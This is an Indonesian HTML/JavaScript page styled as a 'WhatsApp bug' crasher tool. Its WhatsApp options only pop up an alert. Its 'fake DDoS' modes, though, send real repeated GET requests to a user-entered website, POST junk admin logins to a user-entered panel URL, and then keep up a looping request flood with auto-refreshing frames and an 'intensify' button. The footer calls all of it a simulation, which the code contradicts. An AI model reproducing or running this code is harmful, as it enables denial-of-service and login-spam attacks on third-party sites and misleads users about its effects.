<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>chat send bug work</title>
    <style>
        /* CSS untuk Styling */
        body {
            background-color: #000;
            color: #fff;
            font-family: sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
        }

        .header-image {
            width: 100%;
            height: auto;
            max-height: 200px;
            background-color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            border-radius: 10px;
            margin-bottom: 20px;
        }

        .header-image img {
             width: 100%;
             content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="300" height="200" viewBox="0 0 300 200"><rect width="300" height="200" fill="#111"/><text x="150" y="100" font-size="20" fill="#888" text-anchor="middle">VXZ CRASHER IMAGE</text></svg>');
        }

        h1 {
            font-size: 2em;
            margin: 0;
        }

        h2 {
            font-size: 1.5em;
            margin-top: 5px;
            color: #ccc;
        }

        .input-group {
            margin: 20px 0;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 5px;
            font-size: 0.9em;
        }

        input[type="text"], textarea, select {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 8px;
            background-color: #222;
            color: #fff;
            font-size: 1em;
            box-sizing: border-box;
            margin-top: 5px;
            border: 2px solid #555;
            font-family: sans-serif;
        }

        textarea {
            height: 100px;
            resize: vertical;
        }

        .select-bug-container {
            position: relative;
            margin-bottom: 20px;
        }

        .select-bug-button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background-color: #333;
            color: #fff;
            font-size: 1em;
            text-align: left;
            cursor: pointer;
            position: relative;
        }

        .select-bug-button::after {
            content: '‚ñº';
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 0.8em;
        }

        .bug-options {
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            background-color: #111;
            border: 1px solid #444;
            border-radius: 8px;
            margin-top: 5px;
            z-index: 10;
            display: none;
            padding: 10px 0;
        }

        .bug-option {
            padding: 12px 15px;
            text-align: left;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .bug-option:hover {
            background-color: #333;
        }

        input[type="radio"] {
            display: none;
        }

        .radio-custom {
            width: 18px;
            height: 18px;
            border-radius: 50%;
            border: 2px solid #fff;
            display: inline-block;
            position: relative;
        }

        input[type="radio"]:checked + .radio-custom::after {
            content: '';
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #9b59b6;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        .send-button {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 10px;
            background-color: #9b59b6;
            color: #fff;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-top: 15px;
            box-shadow: 0 4px 15px rgba(155, 89, 182, 0.5);
        }

        .send-button:hover {
            background-color: #8e44ad;
        }

        .send-button:disabled {
            background-color: #666;
            cursor: not-allowed;
        }

        .footer-text {
            margin-top: 15px;
            font-size: 0.8em;
            color: #aaa;
        }

        .bug-options-visible {
            display: block;
        }
        
        .progress-container {
            margin-top: 15px;
            display: none;
        }
        
        .progress-bar {
            width: 100%;
            height: 10px;
            background-color: #333;
            border-radius: 5px;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            background-color: #9b59b6;
            width: 0%;
            transition: width 0.1s;
        }
        
        .progress-text {
            margin-top: 5px;
            font-size: 0.8em;
            color: #aaa;
        }

        .message-input {
            display: none;
        }

        .message-input-visible {
            display: block;
        }

        .status-log {
            margin-top: 10px;
            padding: 10px;
            background-color: #222;
            border-radius: 8px;
            font-size: 0.8em;
            text-align: left;
            max-height: 150px;
            overflow-y: auto;
            display: none;
        }

        .log-entry {
            margin: 2px 0;
            padding: 2px 5px;
            border-radius: 3px;
        }

        .log-success {
            background-color: rgba(46, 204, 113, 0.2);
            color: #2ecc71;
        }

        .log-error {
            background-color: rgba(231, 76, 60, 0.2);
            color: #e74c3c;
        }

        .log-warning {
            background-color: rgba(241, 196, 15, 0.2);
            color: #f1c40f;
        }

        .website-preview {
            margin-top: 15px;
            border: 2px solid #444;
            border-radius: 8px;
            overflow: hidden;
            display: none;
        }

        .preview-header {
            background-color: #333;
            padding: 8px;
            font-weight: bold;
            border-bottom: 1px solid #444;
        }

        .preview-content {
            height: 200px;
            background-color: #111;
        }

        .preview-iframe {
            width: 100%;
            height: 100%;
            border: none;
        }

        .lag-controls {
            margin-top: 10px;
            display: none;
        }

        .lag-button {
            background-color: #e74c3c;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }

        .lag-button:hover {
            background-color: #c0392b;
        }

        .browser-tab {
            margin-top: 15px;
            border: 2px solid #444;
            border-radius: 8px;
            overflow: hidden;
            display: none;
        }

        .tab-header {
            background-color: #333;
            padding: 8px;
            font-weight: bold;
            border-bottom: 1px solid #444;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .tab-content {
            height: 300px;
            background-color: #111;
        }

        .new-tab-button {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 0.8em;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header-image">
        <img src="https://i.imgur.com/bkCcY73.jpeg" alt="VXZ Crasher Image">
    </div>
    <h1>BUG WHATSAPP APK</h1>
    <h2>BY RAYHAN</h2>

    <div class="input-group">
        <label for="target-number">Target Website/Number</label>
        <input type="text" id="target-number" placeholder="Masukan no target atau URL website">
    </div>

    <div class="input-group message-input" id="message-input">
        <label for="message">Pesan WhatsApp</label>
        <textarea id="message" placeholder="Masukkan pesan yang ingin dikirim"></textarea>
    </div>

    <div class="select-bug-container">
        <label>Pilih Type Bug.</label>
        <div class="select-bug-button" id="bug-select-display">SELECT BUG Vxz</div>

        <div class="bug-options" id="bug-options">
            <label class="bug-option" data-text="blank hard" data-message="">
                <input type="radio" name="bug-type" value="blank hard" checked>
                <span>blank hard ‚≠ê</span>
                <span class="radio-custom"></span>
            </label>
            <label class="bug-option" data-text="Forclose 24j" data-message="">
                <input type="radio" name="bug-type" value="Forceclose 24i">
                <span>Forclose 24j ‚ö°</span>
                <span class="radio-custom"></span>
            </label>
            <label class="bug-option" data-text="delay parah" data-message="">
                <input type="radio" name="bug-type" value="delay parah">
                <span>delay parah üî•</span>
                <span class="radio-custom"></span>
            </label>
            <label class="bug-option" data-text="ddos panel boongan" data-message="">
                <input type="radio" name="bug-type" value="ddos panel boongan">
                <span>DDOS Panel Boongan ‚ö°</span>
                <span class="radio-custom"></span>
            </label>
            <label class="bug-option" data-text="ddos website boongan" data-message="">
                <input type="radio" name="bug-type" value="ddos website boongan">
                <span>DDOS Website Boongan üåê</span>
                <span class="radio-custom"></span>
            </label>
        </div>
    </div>

    <div class="progress-container" id="progress-container">
        <div class="progress-bar">
            <div class="progress" id="progress"></div>
        </div>
        <div class="progress-text" id="progress-text">Mengirim request...</div>
    </div>

    <div class="website-preview" id="website-preview">
        <div class="preview-header">Preview Website Target</div>
        <div class="preview-content">
            <iframe class="preview-iframe" id="preview-iframe" sandbox="allow-scripts"></iframe>
        </div>
    </div>

    <div class="browser-tab" id="browser-tab">
        <div class="tab-header">
            <span>Simulasi Browser Tab</span>
            <button class="new-tab-button" id="open-new-tab">Buka Tab Baru</button>
        </div>
        <div class="tab-content">
            <iframe class="preview-iframe" id="tab-iframe" sandbox="allow-scripts"></iframe>
        </div>
    </div>

    <div class="lag-controls" id="lag-controls">
        <button class="lag-button" id="intensify-lag">üî• INTENSIFKAN LAG</button>
        <button class="lag-button" id="stop-lag">üõë STOP LAG</button>
    </div>

    <div class="status-log" id="status-log"></div>

    <button class="send-button" id="send-button">SEND BUG</button>

    <div class="footer-text">
        Jangan disalahgunakan ya! - Efek hanya simulasi
    </div>
</div>

<script>
    // Variabel global
    let selectedBugType = "blank hard";
    let isDDoSRunning = false;
    let ddosInterval;
    let requestCount = 0;
    const totalRequests = 50;
    let websiteRefreshInterval;
    let lagIntensity = 1;
    let isLagActive = false;
    let autoRefreshTabs = [];

    // Elemen DOM
    const bugSelectDisplay = document.getElementById('bug-select-display');
    const bugOptions = document.getElementById('bug-options');
    const targetNumberInput = document.getElementById('target-number');
    const messageInput = document.getElementById('message-input');
    const messageTextarea = document.getElementById('message');
    const sendButton = document.getElementById('send-button');
    const progressContainer = document.getElementById('progress-container');
    const progressBar = document.getElementById('progress');
    const progressText = document.getElementById('progress-text');
    const statusLog = document.getElementById('status-log');
    const websitePreview = document.getElementById('website-preview');
    const previewIframe = document.getElementById('preview-iframe');
    const browserTab = document.getElementById('browser-tab');
    const tabIframe = document.getElementById('tab-iframe');
    const openNewTabBtn = document.getElementById('open-new-tab');
    const lagControls = document.getElementById('lag-controls');
    const intensifyLagBtn = document.getElementById('intensify-lag');
    const stopLagBtn = document.getElementById('stop-lag');

    // Event listener untuk dropdown
    bugSelectDisplay.addEventListener('click', function() {
        bugOptions.classList.toggle('bug-options-visible');
    });

    // Event listener untuk pilihan bug
    document.querySelectorAll('.bug-option').forEach(option => {
        option.addEventListener('click', function() {
            const text = this.getAttribute('data-text');
            bugSelectDisplay.textContent = text;
            bugOptions.classList.remove('bug-options-visible');
            selectedBugType = text;
            
            if (selectedBugType === "ddos panel boongan") {
                targetNumberInput.placeholder = "Masukkan link panel (contoh: https://panel.snownode.com/login)";
                messageInput.classList.remove('message-input-visible');
                statusLog.style.display = 'block';
                websitePreview.style.display = 'none';
                browserTab.style.display = 'none';
                lagControls.style.display = 'none';
            } else if (selectedBugType === "ddos website boongan") {
                targetNumberInput.placeholder = "Masukkan URL website (contoh: https://Nazamacloud.my.id)";
                messageInput.classList.remove('message-input-visible');
                statusLog.style.display = 'block';
                websitePreview.style.display = 'block';
                browserTab.style.display = 'block';
                lagControls.style.display = 'block';
            } else {
                targetNumberInput.placeholder = "Masukan no target";
                messageInput.classList.add('message-input-visible');
                statusLog.style.display = 'none';
                websitePreview.style.display = 'none';
                browserTab.style.display = 'none';
                lagControls.style.display = 'none';
            }
        });
    });

    // Event listener untuk tombol kirim
    sendButton.addEventListener('click', function() {
        const target = targetNumberInput.value.trim();
        
        if (!target) {
            alert('Harap masukkan target!');
            return;
        }
        
        if (selectedBugType === "ddos panel boongan") {
            startDDoSAttack(target, 'panel');
        } else if (selectedBugType === "ddos website boongan") {
            startDDoSAttack(target, 'website');
        } else {
            const message = messageTextarea.value.trim();
            if (!message) {
                alert('Harap masukkan pesan!');
                return;
            }
            sendWhatsAppMessage(target, message);
        }
    });

    // Event listener untuk buka tab baru
    openNewTabBtn.addEventListener('click', function() {
        const targetUrl = targetNumberInput.value.trim();
        if (targetUrl && isValidURL(targetUrl)) {
            createAutoRefreshTab(targetUrl);
        } else {
            alert('Masukkan URL website yang valid terlebih dahulu!');
        }
    });

    // Event listener untuk kontrol lag
    intensifyLagBtn.addEventListener('click', function() {
        lagIntensity++;
        addLog(`üî• Lag diintensifkan ke level ${lagIntensity}`, 'warning');
        // Intensifkan semua tab yang aktif
        autoRefreshTabs.forEach(tab => {
            tab.intensity = lagIntensity;
        });
    });

    stopLagBtn.addEventListener('click', function() {
        stopAllLagEffects();
        addLog('üõë Semua efek lag dihentikan', 'success');
    });

    // Fungsi untuk membuat tab dengan auto-refresh
    function createAutoRefreshTab(targetUrl) {
        const tabId = 'tab-' + Date.now();
        const tab = {
            id: tabId,
            url: targetUrl,
            intensity: lagIntensity,
            refreshCount: 0,
            iframe: null
        };

        // Buat iframe baru untuk tab
        const newIframe = document.createElement('iframe');
        newIframe.className = 'preview-iframe';
        newIframe.sandbox = 'allow-scripts';
        newIframe.src = targetUrl;
        
        // Tambahkan ke DOM (simulasi tab baru)
        const tabContainer = document.createElement('div');
        tabContainer.className = 'browser-tab';
        tabContainer.style.marginTop = '10px';
        tabContainer.innerHTML = `
            <div class="tab-header">
                <span>Tab ${autoRefreshTabs.length + 1} - AUTO REFRESH</span>
                <button class="new-tab-button" onclick="closeTab('${tabId}')">Tutup</button>
            </div>
            <div class="tab-content"></div>
        `;
        
        tabContainer.querySelector('.tab-content').appendChild(newIframe);
        document.querySelector('.container').insertBefore(tabContainer, statusLog);
        
        tab.iframe = newIframe;
        autoRefreshTabs.push(tab);
        
        // Mulai auto-refresh untuk tab ini
        startTabAutoRefresh(tab);
        
        addLog(`üÜï Tab baru dibuat: ${targetUrl}`, 'success');
    }

    // Fungsi untuk auto-refresh tab
    function startTabAutoRefresh(tab) {
        const refreshInterval = setInterval(() => {
            if (!isLagActive) {
                clearInterval(refreshInterval);
                return;
            }
            
            tab.refreshCount++;
            
            // AUTO-REFRESH dengan parameter random
            const randomParam = '&autorefresh=' + Date.now() + '&count=' + tab.refreshCount;
            const newUrl = tab.url + (tab.url.includes('?') ? randomParam : '?' + randomParam.substring(1));
            
            if (tab.iframe) {
                tab.iframe.src = newUrl;
            }
            
            addLog(`üîÑ Tab ${tab.id}: Auto-refresh #${tab.refreshCount}`, 'warning');
            
        }, 3000); // Refresh setiap 3 detik - LEBIH CEPAT!
        
        tab.interval = refreshInterval;
    }

    // Fungsi untuk menutup tab
    window.closeTab = function(tabId) {
        const tabIndex = autoRefreshTabs.findIndex(tab => tab.id === tabId);
        if (tabIndex !== -1) {
            const tab = autoRefreshTabs[tabIndex];
            if (tab.interval) {
                clearInterval(tab.interval);
            }
            autoRefreshTabs.splice(tabIndex, 1);
            // Hapus elemen dari DOM
            const tabElement = document.querySelector(`[data-tab-id="${tabId}"]`);
            if (tabElement) {
                tabElement.remove();
            }
            addLog(`‚ùå Tab ${tabId} ditutup`, 'success');
        }
    };

    // Fungsi untuk mengirim pesan WhatsApp
    function sendWhatsAppMessage(target, message) {
        alert(`Mengirim bug ${selectedBugType} ke ${target}...\n\nPesan: ${message}`);
        targetNumberInput.value = '';
        messageTextarea.value = '';
    }

    // Fungsi untuk memulai serangan DDOS
    function startDDoSAttack(targetUrl, type) {
        if (isDDoSRunning) {
            alert('Serangan DDOS sedang berjalan!');
            return;
        }
        
        if (!isValidURL(targetUrl)) {
            alert('Format URL tidak valid! Pastikan URL dimulai dengan http:// atau https://');
            return;
        }
        
        // Setup UI
        progressContainer.style.display = 'block';
        progressBar.style.width = '0%';
        progressText.textContent = 'Mengirim request...';
        isDDoSRunning = true;
        sendButton.disabled = true;
        requestCount = 0;
        statusLog.innerHTML = '';
        lagIntensity = 1;
        
        // Tampilkan preview website
        previewIframe.src = targetUrl;
        tabIframe.src = targetUrl;
        addLog(`Website preview dimuat: ${targetUrl}`, 'success');

        // Mulai serangan
        const startTime = Date.now();
        const duration = 10000; // 10 detik
        
        ddosInterval = setInterval(async () => {
            if (requestCount >= totalRequests) {
                stopDDoSAttack();
                // Mulai efek lag dan auto-refresh setelah DDOS selesai
                if (type === 'website') {
                    startWebsiteLagEffect(targetUrl);
                }
                return;
            }

            // Kirim 1-5 request sekaligus
            const batchSize = Math.min(Math.floor(Math.random() * 5) + 1, totalRequests - requestCount);
            const promises = [];

            for (let i = 0; i < batchSize; i++) {
                if (requestCount < totalRequests) {
                    requestCount++;
                    promises.push(sendRequest(targetUrl, requestCount, type));
                    
                    // Update progress
                    const progressPercent = (requestCount / totalRequests) * 100;
                    progressBar.style.width = `${progressPercent}%`;
                    progressText.textContent = `Request ${requestCount}/${totalRequests}`;
                }
            }

            // Tunggu semua request selesai
            await Promise.allSettled(promises);

        }, 100);

        // Hentikan setelah 10 detik
        setTimeout(() => {
            if (isDDoSRunning) {
                stopDDoSAttack();
                const elapsedTime = (Date.now() - startTime) / 1000;
                addLog(`Serangan selesai! ${requestCount} request dikirim dalam ${elapsedTime.toFixed(1)} detik`, 'success');
                
                // Mulai efek lag dan auto-refresh setelah DDOS selesai
                if (type === 'website') {
                    startWebsiteLagEffect(targetUrl);
                }
            }
        }, duration);
    }

    // Fungsi untuk membuat website menjadi tidak bisa diakses
    function startWebsiteLagEffect(targetUrl) {
        isLagActive = true;
        addLog('üö® MULAI EFEK AUTO-REFRESH TOTAL üö®', 'warning');
        addLog('Website target TIDAK BISA DIAKSES - Auto-refresh setiap 3 detik!', 'warning');
        addLog('Buka tab baru untuk melihat efeknya!', 'warning');
        
        // 1. AUTO-REFRESH PREVIEW IFRAME (SETIAP 3 DETIK)
        let previewRefreshCount = 0;
        const previewRefresh = setInterval(() => {
            if (!isLagActive) {
                clearInterval(previewRefresh);
                return;
            }
            
            previewRefreshCount++;
            const randomParam = '&crash=' + Date.now() + '&preview=' + previewRefreshCount;
            previewIframe.src = targetUrl + (targetUrl.includes('?') ? randomParam : '?' + randomParam.substring(1));
            
            addLog(`üîÑ Preview refresh #${previewRefreshCount}`, 'warning');
        }, 3000);

        // 2. AUTO-REFRESH TAB IFRAME (SETIAP 3 DETIK)
        let tabRefreshCount = 0;
        const tabRefresh = setInterval(() => {
            if (!isLagActive) {
                clearInterval(tabRefresh);
                return;
            }
            
            tabRefreshCount++;
            const randomParam = '&crash=' + Date.now() + '&tab=' + tabRefreshCount;
            tabIframe.src = targetUrl + (targetUrl.includes('?') ? randomParam : '?' + randomParam.substring(1));
            
            addLog(`üîÑ Tab refresh #${tabRefreshCount}`, 'warning');
        }, 3000);

        // 3. SERANGAN REQUEST TERUS MENERUS KE SERVER
        const serverAttack = setInterval(() => {
            if (!isLagActive) {
                clearInterval(serverAttack);
                return;
            }
            
            // Kirim 10-20 request secara bersamaan
            const attackSize = 10 + Math.floor(Math.random() * 10);
            for (let i = 0; i < attackSize; i++) {
                fetch(targetUrl + '?ddos_attack=' + Date.now() + '&i=' + i, {
                    method: 'GET',
                    mode: 'no-cors',
                    cache: 'no-store'
                }).catch(() => {});
            }
            
            addLog(`üí• Server attack: ${attackSize} request dikirim`, 'error');
        }, 2000);

        // Simpan interval untuk dihentikan nanti
        websiteRefreshInterval = {
            preview: previewRefresh,
            tab: tabRefresh,
            server: serverAttack
        };
    }

    // Fungsi untuk mengirim request
    async function sendRequest(url, requestId, type) {
        try {
            if (type === 'panel') {
                const formData = new FormData();
                formData.append('username', 'admin' + Math.random());
                formData.append('password', 'password' + Math.random());
                formData.append('submit', 'Login');

                await fetch(url, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors'
                });
            } else {
                await fetch(url + '?ddos=' + Date.now() + '&request=' + requestId, {
                    method: 'GET',
                    mode: 'no-cors',
                    cache: 'no-store'
                });
            }

            addLog(`Request #${requestId} berhasil dikirim ke ${url}`, 'success');
            
        } catch (error) {
            addLog(`Request #${requestId} gagal: ${error.message}`, 'error');
        }
    }

    // Fungsi untuk menghentikan semua efek lag
    function stopAllLagEffects() {
        isLagActive = false;
        
        // Hentikan semua interval
        if (websiteRefreshInterval) {
            clearInterval(websiteRefreshInterval.preview);
            clearInterval(websiteRefreshInterval.tab);
            clearInterval(websiteRefreshInterval.server);
        }
        
        // Hentikan semua tab auto-refresh
        autoRefreshTabs.forEach(tab => {
            if (tab.interval) {
                clearInterval(tab.interval);
            }
        });
        autoRefreshTabs = [];
        
        addLog('üõë SEMUA EFEK LAG DIHENTIKAN - Website kembali normal', 'success');
    }

    // Fungsi untuk menghentikan serangan
    function stopDDoSAttack() {
        clearInterval(ddosInterval);
        isDDoSRunning = false;
        sendButton.disabled = false;
        progressContainer.style.display = 'none';
        targetNumberInput.value = '';
    }

    // Fungsi untuk menambah log
    function addLog(message, type) {
        const logEntry = document.createElement('div');
        logEntry.className = `log-entry log-${type}`;
        logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
        statusLog.appendChild(logEntry);
        statusLog.scrollTop = statusLog.scrollHeight;
    }

    // Fungsi validasi URL
    function isValidURL(string) {
        try {
            if (!string.startsWith('http://') && !string.startsWith('https://')) {
                string = 'https://' + string;
            }
            new URL(string);
            return true;
        } catch (_) {
            return false;
        }
    }

    // Tutup dropdown saat klik di luar
    document.addEventListener('click', function(event) {
        if (!bugSelectDisplay.contains(event.target) && !bugOptions.contains(event.target)) {
            bugOptions.classList.remove('bug-options-visible');
        }
    });
</script>

</body>
</html>
